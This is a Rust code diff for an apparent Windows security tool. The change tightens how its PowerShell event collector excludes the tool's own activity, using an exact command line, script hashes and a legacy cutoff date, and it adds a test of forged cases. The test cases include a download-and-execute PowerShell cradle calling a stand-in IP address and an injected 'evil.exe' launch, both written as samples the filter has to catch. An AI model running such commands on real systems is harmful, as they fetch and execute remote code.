@@ -26,13 +26,6 @@ use vigil_i18n::{tl, tr};
 
 // --------------------------------------------------------------------------- earlier collectors' folder
 
-/// Where earlier versions ran the collectors from (`%TEMP%\vigil-scan`). Nothing is written there
-/// any more; events.ps1 still uses it to leave out those versions' own PowerShell activity, which
-/// the event logs keep for weeks.
-pub(crate) fn scan_root() -> PathBuf {
-    std::env::temp_dir().join("vigil-scan")
-}
-
 // --------------------------------------------------------------------------- PowerShell collectors
 
 const SCRIPTS: &[(&str, &str)] = &[
@@ -103,6 +96,45 @@ fn bootstrap() -> String {
         len = INPUT_SEPARATOR.len(),
     )
 }
+
+/// The arguments Vigil starts every collector with, after PowerShell's path: events.ps1 leaves
+/// out a PowerShell command line only when it is exactly this (quotes aside).
+const COLLECTOR_FLAGS: [&str; 6] = [
+    "-NoLogo",
+    "-NoProfile",
+    "-NonInteractive",
+    "-ExecutionPolicy",
+    "Bypass",
+    "-Command",
+];
+
+/// The exact end of the collectors' command line: the flags and the bootstrap.
+fn own_command_tail() -> String {
+    format!(" {} {}", COLLECTOR_FLAGS.join(" "), bootstrap())
+}
+
+/// SHA-256 (hex) of the exact text of the bootstrap and of every collector as PowerShell compiles
+/// it (line ends as LF, trailing blanks removed): events.ps1 leaves a script block out only when
+/// its whole text hashes to one of these.
+fn own_script_hashes() -> Vec<String> {
+    let hash = |text: &str| {
+        let normal = text.replace("\r\n", "\n");
+        let digest = Sha256::digest(normal.trim_end().as_bytes());
+        digest.iter().map(|b| format!("{b:02x}")).collect::<String>()
+    };
+    let mut out = vec![hash(&bootstrap())];
+    for (name, _) in SCRIPTS.iter().filter(|(name, _)| *name != "_common") {
+        if let Ok(text) = collector_text(name) {
+            out.push(hash(&text));
+        }
+    }
+    out
+}
+
+/// Earlier versions' own collectors (script files from `%TEMP%\vigil-scan`, or scripts carrying
+/// an earlier version's mark, which no hash here can confirm) are left out only when they ran
+/// before this date. A program imitating them now is reported: events cannot be backdated.
+const LEGACY_COLLECTORS_BEFORE: &str = "2026-11-24T00:00:00Z";
 
 /// The JSON after the last result marker on a collector's standard output.
 fn result_json(stdout: &[u8]) -> Option<&[u8]> {
@@ -336,18 +368,13 @@ fn run_collector(
         payload.push('\n');
     }
     let mut command = Command::new(powershell_path());
+    // The child environment first: elevated, only what Windows reports (a `COR_PROFILER` DLL
+    // named by the user's environment would otherwise load into this elevated PowerShell).
+    #[cfg(windows)]
+    vigil_sys::paths::apply_child_env(&mut command);
     // -ExecutionPolicy only affects this child process: without it, the "Restricted" policy
     // prevents loading the Windows modules the collectors use.
-    command
-        .args([
-            "-NoLogo",
-            "-NoProfile",
-            "-NonInteractive",
-            "-ExecutionPolicy",
-            "Bypass",
-            "-Command",
-        ])
-        .arg(bootstrap());
+    command.args(COLLECTOR_FLAGS).arg(bootstrap());
     for (name, _) in std::env::vars_os() {
         if name.to_string_lossy().to_uppercase().starts_with("PC_ARG_") {
             command.env_remove(name);
@@ -1521,12 +1548,15 @@ fn jobs() -> Vec<(&'static str, Job)> {
             run_collector("system", &[], Some(&input.shortcuts), 300, cancel)
         }),
         ("events", |_, days, cancel| {
-            // The collectors' own PowerShell activity is left out: SelfMark is on this version's
-            // command line and scripts, SelfDir where earlier versions ran them from.
+            // The collectors' own PowerShell activity is left out only when it is exactly
+            // Vigil's: its exact command line, the exact text of its scripts (by hash), and
+            // earlier versions' file-based runs from before this version existed.
             let params = [
                 ("Days", days.to_string()),
-                ("SelfDir", scan_root().display().to_string()),
-                ("SelfMark", self_mark()),
+                ("SelfPowerShell", powershell_path().display().to_string()),
+                ("SelfTail", own_command_tail()),
+                ("SelfHashes", own_script_hashes().join(",")),
+                ("LegacyBefore", LEGACY_COLLECTORS_BEFORE.to_string()),
             ];
             run_collector("events", &params, None, 600, cancel)
         }),
@@ -1772,6 +1802,130 @@ mod tests {
         let boot = bootstrap();
         assert!(boot.contains(&self_mark()));
         assert!(!boot.contains('"'), "one command-line argument: no double quotes");
+    }
+
+    /// The events collector leaves out only Vigil's exact command line and the exact text of its
+    /// scripts: a forged mark, an extra command or another program is reported.
+    #[cfg(windows)]
+    #[test]
+    fn only_vigils_exact_powershell_is_left_out_of_the_events() {
+        let events = SCRIPTS
+            .iter()
+            .find(|(name, _)| *name == "events")
+            .map(|(_, body)| *body)
+            .unwrap_or_default();
+        let start = events.find("# <self-filter>").expect("start marker");
+        let end = events.find("# </self-filter>").expect("end marker");
+        let block = &events[start..end];
+        let ps = powershell_path().display().to_string();
+        let boot = bootstrap();
+        let mark = self_mark();
+        let system = collector_text("system").expect("system");
+        let own = format!("\"{ps}\" -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"{boot}\"");
+        let cases: Vec<(&str, String, &str, &str)> = vec![
+            // (kind, text, time, expected)
+            ("cmd", own.clone(), "", "1"),
+            ("cmd", own.replace(&mark, "VigilCollector-0123456789ab"), "", "1"),
+            (
+                "cmd",
+                format!("{own} ; Start-Process C:\\Users\\jdoe\\evil.exe"),
+                "",
+                "0",
+            ),
+            (
+                "cmd",
+                format!(
+                    "\"{ps}\" -NoProfile -Command \"$VigilMark='{mark}'; iex (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')\""
+                ),
+                "",
+                "0",
+            ),
+            (
+                "cmd",
+                format!(
+                    "C:\\Users\\jdoe\\powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"{boot}\""
+                ),
+                "",
+                "0",
+            ),
+            ("text", system.clone(), "", "1"),
+            ("text", format!("{}\r\n", system.replace('\n', "\r\n")), "", "1"),
+            ("text", format!("{system}\nInvoke-Evil"), "", "0"),
+            ("text", format!("# {mark}\nInvoke-Evil"), "", "0"),
+            (
+                "legacy",
+                "# VigilCollector-0123456789ab\nInvoke-Evil".into(),
+                "2026-11-30T10:00:00Z",
+                "0",
+            ),
+            (
+                "legacy",
+                "# VigilCollector-0123456789ab\nInvoke-Evil".into(),
+                "2026-11-20T10:00:00Z",
+                "1",
+            ),
+            (
+                "legacy",
+                r"C:\Users\jdoe\AppData\Local\Temp\vigil-scan\ps-0123456789abcdef\events.ps1".into(),
+                "2026-11-20T10:00:00Z",
+                "1",
+            ),
+            (
+                "legacy",
+                r"C:\Users\jdoe\AppData\Local\Temp\vigil-scan\ps-0123456789abcdef\events.ps1".into(),
+                "2026-11-30T10:00:00Z",
+                "0",
+            ),
+        ];
+        // Every value travels in an environment variable: nothing from the test is in the script text.
+        let mut script = String::from(
+            "$SelfPowerShell = $env:PC_PS; $SelfTail = $env:PC_TAIL; $SelfHashes = $env:PC_HASHES; \
+             $LegacyBefore = $env:PC_LEGACY\n",
+        );
+        script.push_str(block);
+        script.push_str(
+            "\nfor ($i = 0; $i -lt [int]$env:PC_N; $i++) {\n\
+             $kind = [Environment]::GetEnvironmentVariable(\"PC_K$i\"); $text = [Environment]::GetEnvironmentVariable(\"PC_T$i\")\n\
+             $time = [Environment]::GetEnvironmentVariable(\"PC_W$i\")\n\
+             $r = switch ($kind) { 'cmd' { Test-OwnCommand $text } 'text' { Test-OwnText $text } \
+             'legacy' { Test-Legacy $text ([DateTime]::Parse($time, [Globalization.CultureInfo]::InvariantCulture, [Globalization.DateTimeStyles]::AdjustToUniversal)) } }\n\
+             if ($r) { 'R1' } else { 'R0' } }\n",
+        );
+        let mut command = Command::new(powershell_path());
+        vigil_sys::paths::apply_child_env(&mut command);
+        command
+            .args([
+                "-NoLogo",
+                "-NoProfile",
+                "-NonInteractive",
+                "-ExecutionPolicy",
+                "Bypass",
+                "-Command",
+                "& ([scriptblock]::Create([Console]::In.ReadToEnd()))",
+            ])
+            .env("PC_PS", &ps)
+            .env("PC_TAIL", own_command_tail())
+            .env("PC_HASHES", own_script_hashes().join(","))
+            .env("PC_LEGACY", LEGACY_COLLECTORS_BEFORE)
+            .env("PC_N", cases.len().to_string())
+            .stdin(std::process::Stdio::piped())
+            .stdout(std::process::Stdio::piped());
+        for (i, (kind, text, time, _)) in cases.iter().enumerate() {
+            command
+                .env(format!("PC_K{i}"), kind)
+                .env(format!("PC_T{i}"), text)
+                .env(format!("PC_W{i}"), time);
+        }
+        let mut child = command.spawn().expect("powershell");
+        if let Some(mut stdin) = child.stdin.take() {
+            use std::io::Write;
+            stdin.write_all(script.as_bytes()).expect("script");
+        }
+        let out = child.wait_with_output().expect("output");
+        let text = String::from_utf8_lossy(&out.stdout);
+        let got: Vec<&str> = text.lines().filter_map(|l| l.trim().strip_prefix('R')).collect();
+        let expected: Vec<&str> = cases.iter().map(|c| c.3).collect();
+        assert_eq!(got, expected, "{text}");
     }
 
     #[test]
